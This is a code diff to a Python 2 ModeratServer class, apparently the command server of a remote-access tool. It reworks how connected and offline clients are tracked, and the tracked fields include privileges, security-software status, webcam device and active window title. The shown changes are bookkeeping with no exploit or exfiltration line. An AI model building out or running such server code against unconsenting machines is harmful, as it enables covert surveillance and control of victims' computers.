@@ -247,28 +247,33 @@ class ModeratServer:
 
         for i, k in self.socks.iteritems():
             if self.socks[i]['id'] in clients:
-                self.shared_socks[i] = {
-                    'status': True,
-                    'ip_address': self.socks[i]['ip_address'],
-                    'socket': self.socks[i]['socket'],
-                    'ostype': self.socks[i]['ostype'],
-                    'protection': self.streaming_socks[i]['protection'],
-                    'os': self.socks[i]['os'],
-                    'user': self.socks[i]['user'] + ' ' + self.socks[i]['id'],
-                    'privileges': self.streaming_socks[i]['privileges'],
-                    'inputdevice': self.socks[i]['inputdevice'],
-                    'webcamdevice': self.socks[i]['webcamdevice'],
-                    'activewindowtitle': self.streaming_socks[i]['activewindowtitle'],
-                }
+                try:
+                    self.shared_socks[i] = {
+                        'status': True,
+                        'ip_address': self.socks[i]['ip_address'],
+                        'socket': self.socks[i]['socket'],
+                        'ostype': self.socks[i]['ostype'],
+                        'protection': self.streaming_socks[i]['protection'],
+                        'os': self.socks[i]['os'],
+                        'user': self.socks[i]['user'] + ' ' + self.socks[i]['id'],
+                        'privileges': self.streaming_socks[i]['privileges'],
+                        'inputdevice': self.socks[i]['inputdevice'],
+                        'webcamdevice': self.socks[i]['webcamdevice'],
+                        'activewindowtitle': self.streaming_socks[i]['activewindowtitle'],
+                    }
+                except KeyError:
+                    pass
             else:
                 if i in self.shared_socks:
                     del self.shared_socks[i]
+
+        self.clear_offline_clients(self.shared_socks)
 
         # TODO: OFFLINE
         offline_clients = ClientsManagment().get_offline_clients(moderator_id)
         if len(offline_clients) > 0:
             for client in offline_clients:
-                self.shared_socks[client[1]] = {
+                self.shared_socks['OFFLINE_'+client[1]] = {
                     'status': False,
                     'ip_address': client[3],
                     'socket': 'OFFLINE',
@@ -283,8 +288,18 @@ class ModeratServer:
                     'alias': client[2],
                     'last_online': client[4],
                 }
+                print 'Checking ID ', client[1]
+                if ClientsManagment().is_online(client[1]):
+                    del self.shared_socks[client[1]]
 
         return str(self.shared_socks)
+
+    def clear_offline_clients(self, _dict):
+        for i in _dict.keys():
+            if type(i) == unicode:
+                print 'DELETE'
+                del _dict[i]
+        return _dict
 
     def command_all(self, payload, client_socket):
         return client_get(self.socks[int(client_socket)]['sock'], payload, client_socket)
